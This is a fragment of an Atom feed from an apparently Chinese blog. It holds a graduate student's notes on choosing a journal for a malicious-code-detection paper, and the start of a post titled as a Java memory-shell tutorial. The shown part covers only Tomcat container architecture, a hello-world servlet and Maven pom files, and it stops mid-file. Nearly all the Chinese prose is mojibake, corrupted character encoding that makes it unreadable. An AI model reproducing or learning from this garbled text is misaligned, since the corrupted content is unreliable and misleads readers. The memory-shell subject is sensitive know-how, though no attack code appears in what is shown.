    <content type="html"><![CDATA[<p>é¦–å…ˆå°±æ˜¯è¦å†™è®ºæ–‡äº†ï¼Œæ²¡æè¿‡ï¼Œè®°å½•ä¸€ä¸‹ï¼Œé¦–å…ˆå°±æ˜¯ä¹‹å‰å¤§é‡çœ‹è¿‡åˆ«äººçš„æ–‡ç« ï¼Œæˆ‘çš„ä¸»é¢˜å°±æ˜¯ã€Šæ¶æ„ä»£ç æ£€æµ‹ã€‹ï¼Œå› ä¸ºæˆ‘ä»¬å·¥ä½ç”µè„‘æœ‰å¤§é‡æ¶æ„æ–‡ä»¶ï¼Œä¾›æˆ‘ä»¬è®­ç»ƒä½¿ç”¨ã€‚</p><h1 id="ç¡®è®¤æœŸåˆŠ"><a href="#ç¡®è®¤æœŸåˆŠ" class="headerlink" title="ç¡®è®¤æœŸåˆŠ"></a>ç¡®è®¤æœŸåˆŠ</h1><p>è¿™å—å†…å®¹ä¸»è¦æ˜¯æ ¹æ®æˆ‘è‡ªå·±çš„æƒ³æ³•æ¥çš„ã€‚</p><p>å¦‚ä¸‹å›¾ï¼Œæˆ‘çœ‹åˆ°äº†è¿™ç¯‡è·Ÿæˆ‘å†…å®¹å…³è”çš„</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909153946239.png" alt="image-20250909153946239"></p><p>å·¦ä¸Šè§’æ˜¾ç¤ºæœ‰è¿™ä¸ªæœŸåˆŠåç§°ï¼Œç‚¹å‡»è¿›å…¥</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909154130470.png" alt="image-20250909154130470"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909164927458.png" alt="image-20250909164927458"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909154200841.png" alt="image-20250909154200841"></p><h1 id="æœŸåˆŠå®˜ç½‘"><a href="#æœŸåˆŠå®˜ç½‘" class="headerlink" title="æœŸåˆŠå®˜ç½‘"></a>æœŸåˆŠå®˜ç½‘</h1><p>ç›´æ¥ç™¾åº¦æœç´¢è¿›å…¥å®˜ç½‘ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909165153881.png" alt="image-20250909165153881"></p><h1 id="æŠ•ç¨¿æŒ‡å—"><a href="#æŠ•ç¨¿æŒ‡å—" class="headerlink" title="æŠ•ç¨¿æŒ‡å—"></a>æŠ•ç¨¿æŒ‡å—</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909165337985.png" alt="image-20250909165337985"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909165427254.png" alt="image-20250909165427254"></p><h1 id="è®ºæ–‡æ¨¡ç‰ˆ"><a href="#è®ºæ–‡æ¨¡ç‰ˆ" class="headerlink" title="è®ºæ–‡æ¨¡ç‰ˆ"></a>è®ºæ–‡æ¨¡ç‰ˆ</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909172954200.png" alt="image-20250909172954200"></p><p>ä¸‹è½½ä¸‹æ¥æ˜¯PDFï¼Œè½¬æˆwordã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250909173219011.png" alt="image-20250909173219011"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é¦–å…ˆå°±æ˜¯è¦å†™è®ºæ–‡äº†ï¼Œæ²¡æè¿‡ï¼Œè®°å½•ä¸€ä¸‹ï¼Œé¦–å…ˆå°±æ˜¯ä¹‹å‰å¤§é‡çœ‹è¿‡åˆ«äººçš„æ–‡ç« ï¼Œæˆ‘çš„ä¸»é¢˜å°±æ˜¯ã€Šæ¶æ„ä»£ç æ£€æµ‹ã€‹ï¼Œå› ä¸ºæˆ‘ä»¬å·¥ä½ç”µè„‘æœ‰å¤§é‡æ¶æ„æ–‡ä»¶ï¼Œä¾›æˆ‘ä»¬è®­ç»ƒä½¿ç”¨ã€‚&lt;/p&gt;
&lt;h1 id=&quot;ç¡®è®¤æœŸåˆŠ&quot;&gt;&lt;a href=&quot;#ç¡®è®¤æœŸåˆŠ&quot; class=&quot;headerlink&quot; title=&quot;ç¡®è®¤</summary>
      
    
    
    
    <category term="ç ”ç©¶ç”Ÿç”Ÿæ´»" scheme="https://250wuyifan.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="ç ”ç©¶ç”Ÿç”Ÿæ´»" scheme="https://250wuyifan.github.io/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>ä»é›¶æŒæ¡javaå†…å­˜é©¬</title>
    <link href="https://250wuyifan.github.io/2025/09/06/%E4%BB%8E%E9%9B%B6%E6%8E%8C%E6%8F%A1java%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://250wuyifan.github.io/2025/09/06/%E4%BB%8E%E9%9B%B6%E6%8E%8C%E6%8F%A1java%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2025-09-06T15:25:51.000Z</published>
    <updated>2025-09-09T17:53:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Tomcat-å®¹å™¨"><a href="#Tomcat-å®¹å™¨" class="headerlink" title="Tomcat å®¹å™¨"></a>Tomcat å®¹å™¨</h2><p>Tomcat è®¾è®¡äº†å››ç§å®¹å™¨ï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextå’ŒWrapperï¼Œå…¶å…³ç³»å¦‚ä¸‹ï¼š<br>1.è¿æ¥å™¨è´Ÿè´£å¤–éƒ¨äº¤æµï¼Œå®¹å™¨è´Ÿè´£å†…éƒ¨å¤„ç†ã€‚å…·ä½“æ¥è¯´å°±æ˜¯ï¼Œè¿æ¥å™¨å¤„ç† Socket é€šä¿¡å’Œåº”ç”¨å±‚åè®®çš„è§£æï¼Œå¾—åˆ° Servletè¯·æ±‚ï¼›<br>2.è€Œå®¹å™¨åˆ™è´Ÿè´£å¤„ç† Servletè¯·æ±‚ã€‚å®¹å™¨ï¼šé¡¾åæ€ä¹‰å°±æ˜¯æ‹¿æ¥è£…ä¸œè¥¿çš„ï¼Œ æ‰€ä»¥ Tomcat å®¹å™¨å°±æ˜¯æ‹¿æ¥è£…è½½ Servletã€‚</p><p>Tomcat è®¾è®¡äº† 4 ç§å®¹å™¨ï¼Œåˆ†åˆ«æ˜¯ Engineã€Hostã€Contextå’Œ Wrapperã€‚Server ä»£è¡¨ Tomcat å®ä¾‹ã€‚<br>â˜…â˜…â˜…<code>Wrapper è¡¨ç¤ºä¸€ä¸ª Servlet ï¼ŒContext è¡¨ç¤ºä¸€ä¸ª Web åº”ç”¨ç¨‹åºï¼Œè€Œä¸€ä¸ª Web ç¨‹åºå¯èƒ½æœ‰å¤šä¸ª Servlet ï¼›Host è¡¨ç¤ºä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œæˆ–è€…è¯´ä¸€ä¸ªç«™ç‚¹ï¼Œä¸€ä¸ª Tomcat å¯ä»¥é…ç½®å¤šä¸ªç«™ç‚¹ï¼ˆHostï¼‰ï¼›ä¸€ä¸ªç«™ç‚¹ï¼ˆ Hostï¼‰ å¯ä»¥éƒ¨ç½²å¤šä¸ª Web åº”ç”¨ï¼›Engine ä»£è¡¨ å¼•æ“ï¼Œç”¨äºç®¡ç†å¤šä¸ªç«™ç‚¹ï¼ˆHostï¼‰ï¼Œä¸€ä¸ª Service åªèƒ½æœ‰ ä¸€ä¸ª Engineã€‚</code></p><p>&#96;æ¸…æ™°è§£æï¼š<br>Tomcatç”±å››å¤§å®¹å™¨ç»„æˆï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextã€Wrapperã€‚è¿™å››ä¸ªç»„ä»¶æ˜¯è´Ÿè´£å…³ç³»ï¼Œå­˜åœ¨åŒ…å«å…³ç³»ã€‚åªåŒ…å«ä¸€ä¸ªå¼•æ“ï¼ˆEngineï¼‰ï¼š<br>Engineï¼ˆå¼•æ“ï¼‰ï¼šè¡¨ç¤ºå¯è¿è¡Œçš„Catalinaçš„servletå¼•æ“å®ä¾‹ï¼Œå¹¶ä¸”åŒ…å«äº†servletå®¹å™¨çš„æ ¸å¿ƒåŠŸèƒ½ã€‚åœ¨ä¸€ä¸ªæœåŠ¡ä¸­åªèƒ½æœ‰ä¸€ä¸ªå¼•æ“ã€‚åŒæ—¶ï¼Œä½œä¸ºä¸€ä¸ªçœŸæ­£çš„å®¹å™¨ï¼ŒEngineå…ƒç´ ä¹‹ä¸‹å¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚å®ƒä¸»è¦åŠŸèƒ½æ˜¯å°†ä¼ å…¥è¯·æ±‚å§”æ‰˜ç»™é€‚å½“çš„è™šæ‹Ÿä¸»æœºå¤„ç†ã€‚å¦‚æœæ ¹æ®åç§°æ²¡æœ‰æ‰¾åˆ°å¯å¤„ç†çš„è™šæ‹Ÿä¸»æœºï¼Œé‚£ä¹ˆå°†æ ¹æ®é»˜è®¤çš„Hostæ¥åˆ¤æ–­è¯¥ç”±å“ªä¸ªè™šæ‹Ÿä¸»æœºå¤„ç†ã€‚<br>Host ï¼ˆè™šæ‹Ÿä¸»æœºï¼‰ï¼šä½œç”¨å°±æ˜¯è¿è¡Œå¤šä¸ªåº”ç”¨ï¼Œå®ƒè´Ÿè´£å®‰è£…å’Œå±•å¼€è¿™äº›åº”ç”¨ï¼Œå¹¶ä¸”æ ‡è¯†è¿™ä¸ªåº”ç”¨ä»¥ä¾¿èƒ½å¤ŸåŒºåˆ†å®ƒä»¬ã€‚å®ƒçš„å­å®¹å™¨é€šå¸¸æ˜¯ Contextã€‚ä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹éƒ½å¯ä»¥éƒ¨ç½²ä¸€ä¸ªæˆ–è€…å¤šä¸ªWeb Appï¼Œæ¯ä¸ªWeb Appå¯¹åº”äºä¸€ä¸ªContextï¼Œå½“Hostè·å¾—ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œå°†æŠŠè¯¥è¯·æ±‚åŒ¹é…åˆ°æŸä¸ªContextä¸Šï¼Œç„¶åæŠŠè¯¥è¯·æ±‚äº¤ç»™è¯¥Contextæ¥å¤„ç†ã€‚ä¸»æœºç»„ä»¶ç±»ä¼¼äºApacheä¸­çš„è™šæ‹Ÿä¸»æœºï¼Œä½†åœ¨Tomcatä¸­åªæ”¯æŒåŸºäºFQDN(å®Œå…¨åˆæ ¼çš„ä¸»æœºå)çš„â€œè™šæ‹Ÿä¸»æœºâ€ã€‚Hostä¸»è¦ç”¨æ¥è§£æweb.xml<br>Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰ï¼šä»£è¡¨ Servlet çš„ Contextï¼Œå®ƒå…·å¤‡äº† Servlet è¿è¡Œçš„åŸºæœ¬ç¯å¢ƒï¼Œå®ƒè¡¨ç¤ºWebåº”ç”¨ç¨‹åºæœ¬èº«ã€‚Context æœ€é‡è¦çš„åŠŸèƒ½å°±æ˜¯ç®¡ç†å®ƒé‡Œé¢çš„ Servlet å®ä¾‹ï¼Œä¸€ä¸ªContextä»£è¡¨ä¸€ä¸ªWebåº”ç”¨ï¼Œä¸€ä¸ªWebåº”ç”¨ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªServletå®ä¾‹ç»„æˆã€‚<br>Wrapperï¼ˆåŒ…è£…å™¨ï¼‰ï¼šä»£è¡¨ä¸€ä¸ª Servletï¼Œå®ƒè´Ÿè´£ç®¡ç†ä¸€ä¸ª Servletï¼ŒåŒ…æ‹¬çš„ Servlet çš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶ã€‚Wrapper æ˜¯æœ€åº•å±‚çš„å®¹å™¨ï¼Œå®ƒæ²¡æœ‰å­å®¹å™¨äº†ï¼Œæ‰€ä»¥è°ƒç”¨å®ƒçš„ addChild å°†ä¼šæŠ¥é”™ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250624155841-0b31c6ca-50d1-1.png" alt="img"></p><p>æˆ‘ä»¬æ­¤æ—¶è¦è®¿é—®<a href="https://manage.xxx.com:8080/user/list">https://manage.xxx.com:8080/user/list</a> ï¼Œtomcat ä¸ºäº†å®ç°è¯·æ±‚å®šä½åˆ°å…·ä½“çš„ servlet ï¼Œä¸ºæ­¤ tomcat è®¾è®¡äº† Mapper ï¼Œå…¶ä¸­ä¿å­˜äº†å®¹å™¨ç»„ä»¶ä¸è®¿é—®è·¯å¾„çš„æ˜ å°„å…³ç³»ã€‚</p><p>â˜…å‡å¦‚æœ‰ç”¨æˆ·è®¿é—®ä¸€ä¸ª URLï¼Œæ¯”å¦‚å›¾ä¸­çš„<a href="http://user.shopping.com:8080/order/buy%EF%BC%8CTomcat">http://user.shopping.com:8080/order/buyï¼ŒTomcat</a> å¦‚ä½•å°†è¿™ä¸ª URL å®šä½åˆ°ä¸€ä¸ª Servlet å‘¢ï¼Ÿ</p><p><strong>1.é¦–å…ˆæ ¹æ®åè®®å’Œç«¯å£å·ç¡®å®šè¿æ¥å™¨ã€‚</strong> </p><p>Tomcat é»˜è®¤çš„ HTTP è¿æ¥å™¨ç›‘å¬ 8080 ç«¯å£ã€é»˜è®¤çš„ AJP è¿æ¥å™¨ç›‘å¬ 8009 ç«¯å£ã€‚ä¸Šé¢ä¾‹å­ä¸­çš„ URL è®¿é—®çš„æ˜¯ 8080 ç«¯å£ï¼Œå› æ­¤è¿™ä¸ªè¯·æ±‚ä¼šè¢« HTTP è¿æ¥å™¨æ¥æ”¶ï¼Œè€Œä¸€ä¸ªè¿æ¥å™¨æ˜¯å±äºä¸€ä¸ª Service ç»„ä»¶çš„ï¼Œè¿™æ · Service ç»„ä»¶å°±ç¡®å®šäº†ã€‚æˆ‘ä»¬è¿˜çŸ¥é“ä¸€ä¸ª Service ç»„ä»¶é‡Œé™¤äº†æœ‰å¤šä¸ªè¿æ¥å™¨ï¼Œè¿˜æœ‰ä¸€ä¸ªå®¹å™¨ç»„ä»¶ï¼Œå…·ä½“æ¥è¯´å°±æ˜¯ä¸€ä¸ª Engine å®¹å™¨ï¼Œå› æ­¤ Service ç¡®å®šäº†ä¹Ÿå°±æ„å‘³ç€ Engine ä¹Ÿç¡®å®šäº†ã€‚</p><p><strong>2.æ ¹æ®åŸŸåé€‰å®š Hostï¼ˆç«™ç‚¹ï¼‰</strong> </p><p>Service å’Œ Engine ç¡®å®šåï¼ŒMapper ç»„ä»¶é€šè¿‡ URL ä¸­çš„åŸŸåå»æŸ¥æ‰¾ç›¸åº”çš„ Host å®¹å™¨ï¼Œæ¯”å¦‚ä¾‹å­ä¸­çš„ URL è®¿é—®çš„åŸŸåæ˜¯user.shopping.comï¼Œå› æ­¤ Mapper ä¼šæ‰¾åˆ° Host2 è¿™ä¸ªå®¹å™¨ã€‚</p><p><strong>3.æ ¹æ® URL è·¯å¾„æ‰¾åˆ° Context ç»„ä»¶ï¼ˆWebåº”ç”¨ï¼‰</strong></p><p>Host ç¡®å®šä»¥åï¼ŒMapper æ ¹æ® URL çš„è·¯å¾„æ¥åŒ¹é…ç›¸åº”çš„ Web åº”ç”¨çš„è·¯å¾„ï¼Œæ¯”å¦‚ä¾‹å­ä¸­è®¿é—®çš„æ˜¯ &#x2F;orderï¼Œå› æ­¤æ‰¾åˆ°äº† Context4 è¿™ä¸ª Context å®¹å™¨ã€‚ </p><p><strong>4.æ ¹æ® URL è·¯å¾„æ‰¾åˆ° Wrapperï¼ˆServletï¼‰</strong></p><p>Context ç¡®å®šåï¼ŒMapper å†æ ¹æ® web.xml ä¸­é…ç½®çš„ Servlet æ˜ å°„è·¯å¾„æ¥æ‰¾åˆ°å…·ä½“çš„ Wrapper å’Œ Servletã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250624155843-0c40a928-50d1-1.png" alt="img"></p><h2 id="servletç»„ä»¶ï¼ˆå°å‹åº”ç”¨ï¼‰"><a href="#servletç»„ä»¶ï¼ˆå°å‹åº”ç”¨ï¼‰" class="headerlink" title="servletç»„ä»¶ï¼ˆå°å‹åº”ç”¨ï¼‰"></a>servletç»„ä»¶ï¼ˆå°å‹åº”ç”¨ï¼‰</h2><h3 id="ç¼–å†™ä¸€ä¸ªç®€å•çš„-servlet"><a href="#ç¼–å†™ä¸€ä¸ªç®€å•çš„-servlet" class="headerlink" title="ç¼–å†™ä¸€ä¸ªç®€å•çš„ servlet"></a>ç¼–å†™ä¸€ä¸ªç®€å•çš„ servlet</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servletLearn<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>servletLearn Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>servletLearn<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907000325127.png" alt="image-20250907000325127"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907000400402.png" alt="image-20250907000400402"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907000335325.png" alt="image-20250907000335325"></p><h2 id="ä»£ç å±‚é¢çœ‹servletåˆå§‹åŒ–ä¸è£…è½½æµç¨‹"><a href="#ä»£ç å±‚é¢çœ‹servletåˆå§‹åŒ–ä¸è£…è½½æµç¨‹" class="headerlink" title="ä»£ç å±‚é¢çœ‹servletåˆå§‹åŒ–ä¸è£…è½½æµç¨‹"></a>ä»£ç å±‚é¢çœ‹servletåˆå§‹åŒ–ä¸è£…è½½æµç¨‹</h2><p>ä¸»è¦å‚è€ƒæ–‡ç« ï¼š</p><blockquote><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">https://longlone.top/å®‰å…¨/java/javaå®‰å…¨/å†…å­˜é©¬/Tomcat-Servletå‹/</a></p></blockquote><p>æˆ‘ä»¬è¿™é‡Œä¸é‡‡ç”¨æˆ‘ä»¬ä¸‹è½½çš„<code>tomcat</code>æ¥è¿è¡Œæˆ‘ä»¬çš„é¡¹ç›®ï¼Œæˆ‘ä»¬ä½¿ç”¨åµŒå…¥å¼<code>tomcat</code>ä¹Ÿå°±æ˜¯æ‰€è°“çš„<code>tomcat-embed-core</code>ã€‚å…³äºåŠ¨æ€è°ƒè¯•ï¼Œæˆ‘æ˜¯å›¾çœäº‹ï¼Œç›´æ¥ç”¨<code>tomcat-embed-core</code>ï¼Œä½ å½“ç„¶ä¹Ÿå¯ä»¥è°ƒè¯•ç›´æ¥è°ƒè¯•<code>tomcat</code>æºç ï¼Œç¯å¢ƒæ­å»ºæ–¹æ³•å¯ä»¥å‚è€ƒ<code>Skay</code>å¸ˆå‚…çš„æ–‡ç« ï¼š</p><blockquote><p><a href="https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw">https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw</a></p></blockquote><p>æˆ‘ä»¬é‡å¼€ä¸€ä¸ªé¡¹ç›®ï¼Œæ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servletLearn1<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>servletLearn1 Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 